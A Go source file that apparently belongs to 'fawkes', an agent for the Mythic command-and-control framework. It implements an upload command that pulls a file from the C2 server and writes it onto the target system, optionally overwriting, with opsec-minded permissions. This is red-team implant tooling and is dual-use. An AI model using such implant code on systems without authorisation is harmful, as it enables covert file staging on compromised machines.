package commands

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

// UploadCommand implements the upload command
type UploadCommand struct{}

// Name returns the command name
func (c *UploadCommand) Name() string {
	return "upload"
}

// Description returns the command description
func (c *UploadCommand) Description() string {
	return "Upload a file to the target system"
}

// UploadArgs represents the arguments for upload command
type UploadArgs struct {
	FileID     string `json:"file_id"`
	RemotePath string `json:"remote_path"`
	Overwrite  bool   `json:"overwrite"`
}

// Execute executes the upload command
func (c *UploadCommand) Execute(task structs.Task) structs.CommandResult {
	args := UploadArgs{}

	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		return errorf("Failed to parse arguments: %v", err)
	}

	// Handle tilde expansion
	fixedFilePath := args.RemotePath
	if strings.HasPrefix(fixedFilePath, "~/") {
		dirname, err := os.UserHomeDir()
		if err != nil {
			return errorf("Failed to resolve home directory: %v", err)
		}
		fixedFilePath = filepath.Join(dirname, fixedFilePath[2:])
	}
	fullPath, err := filepath.Abs(fixedFilePath)
	if err != nil {
		return errorf("Failed to resolve absolute path for %s: %v", fixedFilePath, err)
	}

	// Set up the file transfer request
	r := structs.GetFileFromMythicStruct{}
	r.FileID = args.FileID
	r.FullPath = fullPath
	r.Task = &task
	r.SendUserStatusUpdates = true
	totalBytesWritten := 0

	// Check if file exists
	_, err = os.Stat(fullPath)
	fileExists := err == nil

	if fileExists && !args.Overwrite {
		return errorf("File %s already exists. Reupload with the overwrite parameter, or remove the file before uploading again.", fullPath)
	}

	// Open file for writing — truncate if overwriting, create if new
	// Use 0700 permissions: owner rwx only (opsec — prevent other users from reading/executing)
	fp, err := os.OpenFile(fullPath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0700)
	if err != nil {
		return errorf("Failed to open %s for writing: %v", fullPath, err)
	}
	defer fp.Close() // Safety net: ensure fd is closed even if transfer goroutine panics
	r.ReceivedChunkChannel = make(chan []byte)
	task.Job.GetFileFromMythic <- r

	var writeErr error
	for {
		newBytes := <-r.ReceivedChunkChannel
		if len(newBytes) == 0 {
			break
		}
		_, writeErr = fp.Write(newBytes)
		if writeErr != nil {
			break
		}
		totalBytesWritten += len(newBytes)
	}

	// Close file explicitly to flush writes and catch errors
	if closeErr := fp.Close(); closeErr != nil && writeErr == nil {
		writeErr = closeErr
	}

	if writeErr != nil {
		return errorf("Error writing to %s after %d bytes: %v", fullPath, totalBytesWritten, writeErr)
	}

	if task.DidStop() {
		return errorResult("Task stopped early")
	}

	return successf("Uploaded %d bytes to %s", totalBytesWritten, fullPath)
}
